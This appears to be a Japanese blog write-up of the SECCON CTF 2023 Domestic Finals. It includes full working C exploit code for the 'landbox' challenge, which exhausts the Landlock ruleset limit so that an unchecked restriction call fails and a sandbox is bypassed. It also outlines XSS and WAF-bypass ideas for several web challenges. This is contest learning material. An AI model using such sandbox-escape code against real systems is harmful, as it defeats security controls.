---
id: 'seccon2023-finals'
title: 'SECCON CTF 2023 Finals Writeup'
description: 'SECCON CTF 2023 Domestic Finalsにチームsouthballで出場し、3位を獲得しました。'
tags: ['CTF', 'SECCON', 'Security', 'Web']
isPublished: true
publishedAt: '2023-12-28T15:10:30+09:00'
modifiedAt: '2024-01-11T01:16:00+09:00'
thumbnail:
  imageId: seccon2023FinalsResult
---

# SECCON CTF 2023 Finals Writeup

SECCON CTF 2023 Domestic Finalsにチームsouthball[^1]で出場し、3位を獲得しました。

[^1]: [Wani Hackase](https://www-int.ist.osaka-u.ac.jp/ctf/)メンバーのsouthball, Laika, ciffeliaとOBのCaffeineからなるチームで、「実質Wani Hackase」を自称していた。

https://twitter.com/ciffelia/status/1738921377007304872

フラグを獲得した問題を中心にWriteupを書き残します。チームメンバーのWriteupもあわせてお読みください。

https://github.com/southball/ctf-writeups/blob/main/SECCON-CTF-2023-Final/README.en.md

## 競技時間内にフラグを獲得した問題

### landbox [misc]

> Give up flag.
>
> nc landbox.dom.seccon.games 9999
>
> landbox.tar.gz b177abd17583ca0c1ca7eb6d253d1aac163c9228

https://github.com/SECCON/SECCON2023_final_CTF/tree/main/misc/landbox

nsjail sandboxの中で任意のコードを実行できる問題です。この問題は状況設定を理解するのが大変でした。

まず、netcatでサーバーに接続すると「hashcash token」の入力を求められます。これはPoWにより大量の接続を制限する仕組みのようです。表示されたコマンドをローカルで実行してトークンを生成し、サーバーに送信すると次のステップに進めます。

続いて、「exploit url」の入力を求められます。ここで入力したURLのファイルがサーバーにダウンロードされ、実行可能になります。

ダウンロードが完了するとサーバー上でDockerコンテナが起動します。コンテナ内では[nsjail](https://github.com/google/nsjail)というサンドボックスが起動し、nsjail sandbox内のシェルに接続します。

配布されている`Dockerfile`と`nsjail.conf`を読むと、nsjail sandbox内のファイルシステムは以下のようになっていることがわかります。

```
/
├── bin/
├── lib/
├── lib64/
├── usr/bin/
├── exploit
├── flag-XXXX.txt
└── readflag
```

- `exploit`は先程ダウンロードされた実行可能ファイルです。
- `flag-XXXX.txt`にはフラグが書かれています。このファイルのパーミッションは読み取り可能ですが、ファイル名の`XXXX`の部分がわかりません。
  - ルートディレクトリの読み取り権限が与えられていないため、`ls`などでファイル名を特定することもできません。
- `readflag`はフラグを読み取って出力するプログラムです。`readflag`には`flag-XXXX.txt`のファイル名がハードコードされています。
  - パーミッションが`---x--x--x`に設定されているため、ハードコードされたファイル名を別のプログラムから読み取ることはできません。
  - `readflag`を実行することはできますが、そのまま実行しても`Cannot read flag`と表示されフラグが表示されません。

続いて、配布されている`readflag`のソースコードを読み、フラグが表示されない理由を調べると次のことがわかります。

- `readflag`は、`main`関数で関数`give_up_flag()`を呼んでから`read_flag()`を呼んでいます。
- `give_up_flag()`は、Landlockにより自身のフラグへのアクセスを禁止します。
- `read_flag()`は、`flag-XXXX.txt`を読み取って出力します。

Landlockは最近のLinux Kernelに追加されたサンドボックス機構で、自スレッドのファイルシステム等へのアクセス権を細かく制御することができるようです。

ここまでの設定が理解できれば、この問題は8割方解けたようなものです。

「landlock linux」でGoogle検索して上位に表示されるLinux Kernel Documentationを読み、`give_up_flag()`で行われている処理を把握します。`give_up_flag()`にはドキュメント中のサンプルコードと共通するコードが多くあり、途中まではお手本通りのコードになっていることがわかります。

https://docs.kernel.org/userspace-api/landlock.html

問題は`give_up_flag()`の最後の行で、`landlock_restrict_self()`を実行している箇所です。先程のDocumentationでは、この部分は次のように例示されています。

```c
if (landlock_restrict_self(ruleset_fd, 0)) {
    perror("Failed to enforce ruleset");
    close(ruleset_fd);
    return 1;
}
close(ruleset_fd);
```

ところが、`give_up_flag()`ではエラーハンドリングが行われていません。

```c
landlock_restrict_self(ruleset_fd, 0);
```

この関数は、`landlock_restrict_self()`という名前からわかるように、組み立てたlandlockのルールセットを実際に自スレッドに適用するものです。もしこの関数がエラーを返せば、landlockのルールセットが適用されず、自スレッドのファイルシステムへのアクセスが禁止されません。しかもエラーチェックが行われていないため、エラーが発生してもプログラムは終了せず、`read_flag()`が呼ばれてフラグが表示されるはずです。

`landlock_restrict_self()`が失敗する条件を考えます。まず前行で`prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)`が呼ばれており、自プロセスに新しい権限を与えることが禁止されていることに着目します。あらかじめここで適用されるルールセットより厳しいルールセットを適用しておけば、`landlock_restrict_self()`は失敗するのではないかと考えます。

これを踏まえて、次の処理を実行するプログラムを書き、`exploit`としてサーバーに送信しました。

1. `readflag`で使われているルールセットより厳しいlandlockのルールセットを組み立て、自スレッドに適用する。
2. `readflag`を実行する。

このアプローチはうまくいきませんでした。よく考えると、`readflag`で使われているルールセットは「ファイルシステム上のすべてのファイルへのアクセスを禁止する」というもので、これより厳しいルールセットを組み立てることはできません[^2]。

[^2]: 仮に組み立てることができたとしても、両方のポリシーが同時に適用されるだけでエラーは発生しないかもしれません。

続いて、`landlock_restrict_self()`のドキュメントを読んでエラーを返す条件を調べます。

https://man7.org/linux/man-pages/man2/landlock_restrict_self.2.html#ERRORS

> ERRORS
>
>        landlock_restrict_self() can fail for the following reasons:
>
>        EOPNOTSUPP
>               Landlock is supported by the kernel but disabled at boot
>               time.
>
>        EINVAL flags is not 0.
>
>        EBADF  ruleset_fd is not a file descriptor for the current
>               thread.
>
>        EBADFD ruleset_fd is not a ruleset file descriptor.
>
>        EPERM  ruleset_fd has no read access to the underlying ruleset,
>               or the calling thread is not running with no_new_privs, or
>               it doesn't have the CAP_SYS_ADMIN in its user namespace.
>
>        E2BIG  The maximum number of composed rulesets is reached for the
>               calling thread.  This limit is currently 64.

`E2BIG`が使えそうです。landlockには適用可能なルールセットの数の制限があるのですね。

次のプログラムを書いて`exploit`としてサーバーに送信し、実行するとフラグが手に入ります。

1. ファイルシステムの読み取りを制限しないlandlockのルールセットを繰り返し組み立て、失敗するまで自スレッドに適用する。
2. `readflag`を実行する。

この解法は想定解だったそうです。非想定解として、seccompで`landlock_restrict_self`のsyscallを禁止してから`readflag`を実行することで`landlock_restrict_self`の実行を失敗させたチームがいたそうです。

この問題では国内部門でのFirst Bloodを取れました。終了時点でのSolve数は国際部門で5チーム、国内部門で2チームでした。問題設定が理解できれば比較的簡単だったように感じるのですが、Linux Kernelが絡むSandbox問は意外と敬遠されているんでしょうか。

```c
#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <linux/landlock.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>

#define LANDLOCK_ACCESS_FS_REFER (1ULL << 13)
#define LANDLOCK_ACCESS_FS_TRUNCATE (1ULL << 14)

static struct landlock_ruleset_attr default_landlock_ruleset_attr = {
  .handled_access_fs =
  LANDLOCK_ACCESS_FS_EXECUTE |
  LANDLOCK_ACCESS_FS_WRITE_FILE |
  LANDLOCK_ACCESS_FS_READ_FILE |
  LANDLOCK_ACCESS_FS_READ_DIR |
  LANDLOCK_ACCESS_FS_REMOVE_DIR |
  LANDLOCK_ACCESS_FS_REMOVE_FILE |
  LANDLOCK_ACCESS_FS_MAKE_CHAR |
  LANDLOCK_ACCESS_FS_MAKE_DIR |
  LANDLOCK_ACCESS_FS_MAKE_REG |
  LANDLOCK_ACCESS_FS_MAKE_SOCK |
  LANDLOCK_ACCESS_FS_MAKE_FIFO |
  LANDLOCK_ACCESS_FS_MAKE_BLOCK |
  LANDLOCK_ACCESS_FS_MAKE_SYM |
  LANDLOCK_ACCESS_FS_REFER |
  LANDLOCK_ACCESS_FS_TRUNCATE,
};

static inline int
landlock_create_ruleset(const struct landlock_ruleset_attr *const attr,
                        const size_t size,
                        const __u32 flags) {
  return syscall(__NR_landlock_create_ruleset, attr, size, flags);
}

static inline int
landlock_restrict_self(const int ruleset_fd,
                       const __u32 flags) {
  return syscall(__NR_landlock_restrict_self, ruleset_fd, flags);
}

static inline int
landlock_add_rule(const int ruleset_fd,
                  enum landlock_rule_type rule_type,
                  const void *rule_attr,
                  __u32 flags) {
  return syscall(__NR_landlock_add_rule, ruleset_fd, rule_type, rule_attr, flags);
}

int create_ruleset(void) {
  int abi, ruleset_fd;
  struct landlock_ruleset_attr *ruleset_attr = &default_landlock_ruleset_attr;

  abi = landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION);
  assert (abi >= 0);

  switch (abi) {
    case 1:
      ruleset_attr->handled_access_fs &= ~LANDLOCK_ACCESS_FS_REFER;
      __attribute__((fallthrough));
    case 2:
      ruleset_attr->handled_access_fs &= ~LANDLOCK_ACCESS_FS_TRUNCATE;
  }

  ruleset_fd = landlock_create_ruleset(ruleset_attr, sizeof(*ruleset_attr), 0);
  assert (ruleset_fd >= 0);

  int err;
  struct landlock_path_beneath_attr path_beneath = {
      .allowed_access =
          LANDLOCK_ACCESS_FS_EXECUTE |
          LANDLOCK_ACCESS_FS_READ_FILE |
          LANDLOCK_ACCESS_FS_READ_DIR,
  };

  path_beneath.parent_fd = open("/", O_PATH | O_CLOEXEC);
  if (path_beneath.parent_fd < 0) {
      perror("Failed to open file");
      close(ruleset_fd);
      return -1;
  }
  err = landlock_add_rule(ruleset_fd, LANDLOCK_RULE_PATH_BENEATH,
                          &path_beneath, 0);
  close(path_beneath.parent_fd);
  if (err) {
      perror("Failed to update ruleset");
      close(ruleset_fd);
      return -1;
  }

  return ruleset_fd;
}

int prepare() {
  assert (!prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0));

  for (int i = 0; i < 100; i++) {
    int ruleset_fd = create_ruleset();
    if (ruleset_fd < 0) {
      return -1;
    }
    int err = landlock_restrict_self(ruleset_fd, 0);
    if (err) {
        perror("Failed to restrict");
        printf("i: %d\n", i);
        close(ruleset_fd);
        return -1;
    }
  }
}

int main() {
  prepare();
  if (execl("./readflag", "./readflag", NULL) == -1) {
    printf("exec failed\n");
    return 1;
  }
  return 0;
}
```

追記：終了後に気づいたのですが、もう少し短く書けます。

```c
#include <assert.h>
#include <fcntl.h>
#include <linux/landlock.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>

static struct landlock_ruleset_attr default_landlock_ruleset_attr = {
  .handled_access_fs =
  LANDLOCK_ACCESS_FS_WRITE_FILE,
};

static inline int
landlock_create_ruleset(const struct landlock_ruleset_attr *const attr,
                        const size_t size,
                        const __u32 flags) {
  return syscall(__NR_landlock_create_ruleset, attr, size, flags);
}

static inline int
landlock_restrict_self(const int ruleset_fd,
                       const __u32 flags) {
  return syscall(__NR_landlock_restrict_self, ruleset_fd, flags);
}

int create_ruleset(void) {
  int abi, ruleset_fd;
  struct landlock_ruleset_attr *ruleset_attr = &default_landlock_ruleset_attr;

  abi = landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION);
  assert (abi >= 0);

  ruleset_fd = landlock_create_ruleset(ruleset_attr, sizeof(*ruleset_attr), 0);
  assert (ruleset_fd >= 0);

  return ruleset_fd;
}

void prepare() {
  assert (!prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0));

  for (int i = 0; i < 100; i++) {
    int ruleset_fd = create_ruleset();
    if (ruleset_fd < 0) {
      printf("Failed to create ruleset");
      return;
    }
    int err = landlock_restrict_self(ruleset_fd, 0);
    if (err) {
        perror("Failed to restrict");
        printf("i: %d\n", i);
        return;
    }
  }
}

int main() {
  prepare();
  if (execl("./readflag", "./readflag", NULL) == -1) {
    printf("exec failed\n");
    return 1;
  }
  return 0;
}
```

## 解けなかった問題

### babywaf [web, warmup]

> Do you want a flag? 🚩🚩🚩
>
>     Challenge: http://babywaf.dom.seccon.games:3000/
>
> babywaf.tar.gz 134a20fe95e96a596aef9245f5d870b73854e5dc

https://github.com/SECCON/SECCON2023_final_CTF/tree/main/web/babywaf

Expressで書かれたサーバーが動いており、`givemeflag`というキーが存在するJSONを送信するとフラグを返してくれます。ただしその前にFastifyで書かれたリバースプロキシが動いており、JSONに`givemeflag`というキーが存在するとリクエストを弾いてしまうという状況です。

FastifyとExpressのJSONの処理に違いがあるのではと考え、それぞれのソースコードを読み漁ったものの、使えそうな箇所が見当たりませんでした。

https://github.com/expressjs/body-parser/blob/master/lib/types/json.js

https://github.com/fastify/secure-json-parse/blob/master/index.js

しばらく考えてもわからなかったので放置していたところ、southballがBOMの扱いの違いを見つけて解いてくれました。

https://github.com/southball/ctf-writeups/blob/main/SECCON-CTF-2023-Final/README.en.md#babywaf-web

### cgi-2023 [web]

> CGI is one of the lost technologies.
>
>     Challenge: http://cgi-2023.dom.seccon.games:3000/
>     Admin bot: http://cgi-2023.dom.seccon.games:1337/
>
> cgi-2023.tar.gz 20becdf2032ecbf431ba50aa4a2418ab6450b7d5

https://github.com/SECCON/SECCON2023_final_CTF/tree/main/web/cgi-2023

XSS問題です。Botからのアクセスに対してフラグを含むHTMLを返すウェブサーバーが動いています。Apache + mod_cgiという一般的な構成ですが、CGIがなんとGoで書かれています。

BotにアクセスさせるURLに細工することで、レスポンスに任意のヘッダーを追加したり、レスポンスボディの先頭に任意の文字列を追加したりできます。しかし前段のリバースプロキシで`Content-Security-Policy: default-src 'none'`が強制的に設定されるため、データを外部に送信できないという状況です。

競技時間中には次のことに気づきましたが、解法には至りませんでした。

- ステータスコードの設定は禁止されているが、`Location`ヘッダを指定するとステータスコードが自動的に301になる。
- `Content-Security-Policy-Report-Only`ヘッダを指定できる。しかし、別のポリシーを指定しても`Content-Security-Policy`で設定されているポリシーを無効化することはできない。
- `Access-Control-Allow-Origin`や`Access-Control-Allow-Credentials`が設定できる。しかしCookieの`SameSite`が`Lax`（デフォルト）になっているため、third-party originからのリクエストではCookieが送信されない。
- `Content-Type`ヘッダで`charset`を指定できる。`utf-16le`を指定して何かできないか試してみたが、うまくいかなかった。

想定解は不明ですが、`Content-Security-Policy`が設定されていても`Content-Security-Policy-Report-Only`を使うとCSP違反時にReportが送信されることを使う解法があったようです。

https://hackmd.io/@IOKh9vO3ReOUWJgQcV1WPQ/ryFZXFFwp

`Content-Security-Policy-Report-Only`について調べていて、`report-sample`という機能があるのを初めて知りました。

https://asnokaze.hatenablog.com/entry/20170224/1487863604

### DOMLeakify [web]

> NO LEAK, NO LIFE.
>
>     Challenge: http://domleakify.dom.seccon.games:3000/
>     Admin bot: http://domleakify.dom.seccon.games:1337/
>
> domleakify.tar.gz e6922f3179e1fabeb3615633e434d7b58fd1e6e6

https://github.com/SECCON/SECCON2023_final_CTF/tree/main/web/DOMLeakify

こちらもXSS問題です。Botからのアクセスに対してフラグを含むHTMLが返されます。フラグは次のようにHTMLに露出しており、特定のID/Classが存在するか探索できれば1bitずつ情報を盗めそうなことがわかります。

```html
<li id="S" class="S">S</li>
<li id="SE" class="SE">SE</li>
<li id="SEC" class="SEC">SEC</li>
<!-- ... -->
<li id="SECCON{flag}" class="SECCON{flag}">SECCON{flag}</li>
```

BotにアクセスさせるURLに細工することでページの一部に任意のHTMLを埋め込めますが、HTMLはDOMPurifyでサニタイズされており、`<style>`タグや`loading`属性は禁止されています。

競技時間中には次のことに気づきましたが、解法には至りませんでした。

- BotのブラウザがFirefox。
  - 最新のChromeでは使える機能を塞いでいるのかも？
- ID属性は禁止されてない。
  - ドキュメント内に同じIDが複数存在するとDOMPurifyの挙動が変化するのではないかと推測してDOMPurifyのソースコードを読んだが、そのような挙動は見つからなかった。
- `<label for="">`でIDを指定すると、IDが存在するかで挙動が変わるのでは？
  - 変わらなかった。

想定解は`-moz-element()`を使うものだったそうです。全く思いつきませんでした。

### LemonMD [web]

> 🍋📝✨
>
>     Challenge: http://lemonmd.dom.seccon.games:3000/
>     Admin bot: http://lemonmd.dom.seccon.games:1337/
>
> lemonmd.tar.gz da2c4c79422ace617c2f5e2b85f4d078d8002584

https://github.com/SECCON/SECCON2023_final_CTF/tree/main/web/LemonMD

こちらもXSS問題です。Markdown形式で記事を投稿できるウェブサイトで、Deno + Fresh製です。フラグはBotのCookieに入っているので、XSSを引き起こす記事を投稿しBotにアクセスさせることになります。Markdownのレンダリング時に基本的なサニタイズが行われているため、`<script>`タグや`onerror`属性は使えません。

Freshの特徴として、ページ全体をサーバーサイドでレンダリングしつつ、インタラクティブな部分のみクライアント側でHydrationを行うIsland Architectureを採用していることが挙げられます。Next.jsのApp Router (Server Components)やAstroでも同じアーキテクチャが採用されていますね。

Markdownのレンダリングにはdeno-gfmというライブラリが使われていました。

https://github.com/denoland/deno-gfm

この問題は競技時間中はさっぱりわかリませんでした。想定解は次のようなものだったそうです。

- サーバーから送られてくるHTMLには、Hydrationのための情報をJSONで保持する`<script id="__FRSH_STATE">`要素が存在する。
- 一部の要素ではID属性が許可されているため、`<a id="__FRSH_STATE">`のような要素をMarkdown内で生成でき、Freshにそちらを読ませることができる。
- `__FRSH_STATE`に細工することでPreactの`signal()`に渡される引数をコントロールでき、そこからPrototype Pollutionを引き起こすことができる。

手元で試してみたのですが、Prototype Pollutionを引き起こす部分が実装できなかったので後ほどAuthor Writeupを読んでみます。

## おわりに

国内3位に入賞することができました。正直に言って期待以上の結果です。チームメンバーには感謝しかありません。また、SECCON運営とスポンサーの皆さんにも感謝申し上げます。

Web問を1問も解けなかったのが悔やまれます。どの問題も惜しかったというよりはまだまだ知識が足りないという感じで、引き続き勉強していきたいと思います。

来年は(International Finals出場|Domestic Finals優勝)を目指して精進します。

## 余談

普段は自宅のデスクトップPCでCTFをやっているのですが、今回はオンサイト大会だったためラップトップから自宅PCにリモートデスクトップ接続して問題を解くつもりでした。当日会場に着くとスコアサーバーや問題サーバーが会場のローカルネットワークからのみアクセス可能だったため、TailscaleのSubnet Routerを設定して自宅PCから会場ネットワークにアクセスできるようにしました。Tailscaleは便利ですね。
